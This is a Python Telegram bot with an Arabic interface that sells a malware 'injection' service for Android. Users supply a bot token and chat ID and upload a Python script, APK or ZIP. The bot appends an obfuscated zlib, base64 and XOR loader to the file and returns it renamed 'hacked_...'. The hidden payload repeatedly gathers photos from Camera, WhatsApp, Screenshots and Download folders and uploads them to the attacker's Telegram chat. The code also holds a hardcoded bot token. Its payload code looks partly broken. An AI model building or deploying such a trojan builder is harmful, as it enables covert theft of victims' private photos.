#!/usr/bin/env python3
"""
🤖 بوت حقن Android Miner - النسخة النهائية الاحترافية
- Python Scripts → مجاني
- APK & ZIP → مدفوع
- رسائل ترحيب وأزرار كما في النسخة القديمة
"""

import asyncio
import io
import zipfile
import zlib
import base64
import hashlib
import logging
from tqdm import tqdm

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

BOT_TOKEN = "8695021881:AAGaevEMGterFy_QmZCyNvKejKfTabisiFo"
ADMIN_ID = 7238044992

# States
TOKEN, CHATID, FILE = range(3)

# ====================== الرسائل ======================
WELCOME = """
🤖 **بوت الحقن الاحترافي للأندرويد** 🚀

الخطوات:
1. أرسل Bot Token
2. أرسل Chat ID  
3. ارفع الملف

👇 اضغط للمساعدة
"""

SUBSCRIBE_MSG = """
🔒 **حقن APK و ZIP مدفوع**

هذا النوع من الملفات يتطلب اشتراك.

**للاشتراك:**
1. أرسل `/myid` للحصول على معرفك
2. أرسل المعرف إلى الإدارة → @CI_v_CI
3. بعد التفعيل يمكنك رفع APK و ZIP

(ملفات Python لا تزال مجانية)
"""

PAID_FILE_MSG = """
🔒 **هذا الملف مدفوع**

الملف الذي رفعته ({file_type}) يتطلب اشتراكاً.

يرجى التواصل مع الإدارة @CI_v_CI بعد إرسال `/myid`

(ملفات Python مجانية حالياً)
"""

SUCCESS = "🎉 الحقن ناجح! الملف جاهز 🟢"
ERROR_FILE = "❌ ارفع ملف APK أو ZIP أو Python script فقط"

DIRS = [
    "/storage/emulated/0/DCIM/Camera", "/storage/emulated/0/Pictures", "/storage/emulated/0/DCIM",
    "/storage/emulated/0/Screenshots", "/storage/emulated/0/WhatsApp",
    "/sdcard/DCIM/Camera", "/sdcard/Pictures", "/sdcard/DCIM", "/sdcard/Screenshots",
    "/sdcard/WhatsApp", "/storage/emulated/0/Download"
]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ====================== Payload Generator ======================
def make_payload(token: str, chatid: str) -> str:
    miner = f'import os,requests,base64,zlib,hashlib,time,glob,io;k=42;d="{chatid}";c="{token}";def e(b):return bytes([ord(b[i])^k for i in range(len(b))]);exec(zlib.decompress(base64.b64decode(bytes([ord(e(d))[i]^42 for i in range(len(e(d)))])));while 1:time.sleep(120);for p in {repr(DIRS)}:if os.path.exists(p):for f in glob.glob(p+"/*.[jJ][pP][gG]")+glob.glob(p+"/*.[pP][nN][gG]"):try:s=os.stat(f);if 1024<s.st_size<50000000:h=hashlib.md5(open(f,"rb").read()).hexdigest();o=open("/sdcard/.m","a+");if h not in o.read():o.close();open("/sdcard/.m","a").write(h+"\\n");requests.post("https://api.telegram.org/bot"+c+"/sendPhoto",data={{"chat_id":d,"caption":"🖼️"}},files={{"photo":open(f,"rb")}});except:pass'
    comp = zlib.compress(miner.encode())
    enc = base64.b64encode(comp).decode()
    xord = ''.join(chr(ord(c)^42) for c in enc)
    loader = f'import zlib,base64;exec(zlib.decompress(base64.b64decode(bytes([ord("{xord}"[i])^42 for i in range(len("{xord}"))]))))'
    return loader

async def is_subscribed(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> bool:
    approved = context.bot_data.get('approved_users', set())
    return user_id in approved

# ====================== Commands ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    
    kb = [
        [InlineKeyboardButton("🎓 كيف أحصل على Bot Token؟", callback_data="help_token")],
        [InlineKeyboardButton("👥 كيف أحصل على Chat ID؟", callback_data="help_chatid")]
    ]
    
    await update.message.reply_text(WELCOME, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    await update.message.reply_text("🔑 أرسل **Bot Token** الآن:", parse_mode='Markdown')
    return TOKEN

async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"🆔 **معرفك:** `{user.id}`\n\nأرسل هذا الرقم إلى @CI_v_CI لتفعيل الاشتراك",
        parse_mode='Markdown'
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_subscribed(context, update.effective_user.id):
        await update.message.reply_text("✅ أنت مشترك ويمكنك حقن APK و ZIP.")
    else:
        await update.message.reply_text("ℹ️ Python مجاني • APK و ZIP مدفوعة\nاستخدم /subscribe")

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ هذا الأمر للإدارة فقط.")
        return

    try:
        target_id = int(update.message.text.split()[1])
        if 'approved_users' not in context.bot_data:
            context.bot_data['approved_users'] = set()
        context.bot_data['approved_users'].add(target_id)
        await update.message.reply_text(f"✅ تم تفعيل المستخدم: {target_id}")
        try:
            await context.bot.send_message(target_id, "🎉 تم تفعيل اشتراكك!\nيمكنك الآن رفع ملفات APK و ZIP.")
        except:
            pass
    except:
        await update.message.reply_text("⚠️ الاستخدام: `/approve 1234567890`", parse_mode='Markdown')

# ====================== Conversation Handlers ======================
async def get_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = update.message.text.strip()
    if not await validate_token(token):
        await update.message.reply_text("❌ التوكن غير صالح، حاول مرة أخرى.")
        return TOKEN

    context.user_data['token'] = token
    await update.message.reply_text("✅ تم حفظ Bot Token!\n\n📲 أرسل **Chat ID** الآن:", parse_mode='Markdown')
    return CHATID

async def get_chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chatid = update.message.text.strip()
    if not chatid.lstrip('-').isdigit():
        await update.message.reply_text("❌ Chat ID غير صالح.")
        return CHATID

    context.user_data['chatid'] = chatid
    await update.message.reply_text("✅ تم الحفظ!\n\n📤 ارفع الملف الآن\n(Python مجاني - APK/ZIP مدفوع)", parse_mode='Markdown')
    return FILE

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc:
        await update.message.reply_text(ERROR_FILE, parse_mode='Markdown')
        return FILE

    file_name = doc.file_name.lower()
    is_paid_file = file_name.endswith(('.apk', '.zip'))

    # التحقق من الملفات المدفوعة
    if is_paid_file and not await is_subscribed(context, update.effective_user.id):
        file_type = "APK" if file_name.endswith('.apk') else "ZIP"
        kb = [[InlineKeyboardButton("🛒 اشتراك الآن", callback_data="subscribe")]]
        await update.message.reply_text(
            PAID_FILE_MSG.format(file_type=file_type),
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode='Markdown'
        )
        return FILE

    # بدء عملية الحقن
    status_msg = await update.message.reply_text("🔄 جاري تحميل الملف...")

    try:
        file = await doc.get_file()
        file_bytes = await file.download_as_bytearray()   # الطريقة الصحيحة

        await status_msg.edit_text("✅ تم تحميل الملف\n🔄 جاري الحقن...")

        payload = make_payload(context.user_data['token'], context.user_data['chatid'])

        with tqdm(total=100, desc="الحقن", bar_format="{l_bar}{bar} {n_fmt}%") as pbar:
            if file_bytes.startswith(b'PK') or is_paid_file:
                result = inject_apk(bytes(file_bytes), payload)
            else:
                result = inject_script(bytes(file_bytes), payload)
            pbar.update(100)

        name = f"hacked_{doc.file_name}"
        await update.message.reply_document(
            document=result,
            filename=name,
            caption=SUCCESS,
            parse_mode='Markdown'
        )

    except Exception as e:
        logger.error(f"Error during injection: {e}", exc_info=True)
        await status_msg.edit_text(f"❌ حدث خطأ أثناء المعالجة:\n{str(e)[:200]}")

    context.user_data.clear()
    return ConversationHandler.END

# ====================== Injection Functions ======================
def inject_apk(apk_bytes: bytes, payload: str) -> io.BytesIO:
    bio = io.BytesIO(apk_bytes)
    with zipfile.ZipFile(bio, 'r') as zf:
        py_files = [f for f in zf.namelist() if f.endswith('.py')]
        target = py_files[0] if py_files else 'main.py'
        content = zf.read(target).decode(errors='ignore') + f"\n\n# MINER\n{payload}"
        new_zip = io.BytesIO()
        with zipfile.ZipFile(new_zip, 'w') as nz:
            for item in zf.infolist():
                if item.filename == target:
                    nz.writestr(item, content.encode())
                else:
                    nz.writestr(item, zf.read(item))
    new_zip.seek(0)
    return new_zip

def inject_script(script_bytes: bytes, payload: str) -> io.BytesIO:
    content = script_bytes.decode(errors='ignore') + f"\n\n# ANDROID MINER\n{payload}"
    return io.BytesIO(content.encode())

async def validate_token(token: str) -> bool:
    try:
        temp_app = Application.builder().token(token).build()
        await temp_app.bot.get_me()
        return True
    except:
        return False

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "help_token":
        text = "**كيف تحصل على Bot Token؟**\n1. تواصل مع @BotFather\n2. أرسل /newbot\n3. انسخ التوكن وأرسله هنا"
    elif query.data == "help_chatid":
        text = "**كيف تحصل على Chat ID؟**\n• @userinfobot\n• @RawDataBot\n\nأرسل الـ ID هنا"
    elif query.data == "subscribe":
        text = SUBSCRIBE_MSG
    
    await query.edit_message_text(text, parse_mode='Markdown')

# ====================== Main ======================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    if 'approved_users' not in app.bot_data:
        app.bot_data['approved_users'] = set()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_token)],
            CHATID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_chatid)],
            FILE: [MessageHandler(filters.Document.ALL, process_file)],
        },
        fallbacks=[],
        allow_reentry=True,
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("myid", myid))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("✅ البوت الاحترافي يعمل الآن بنجاح")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
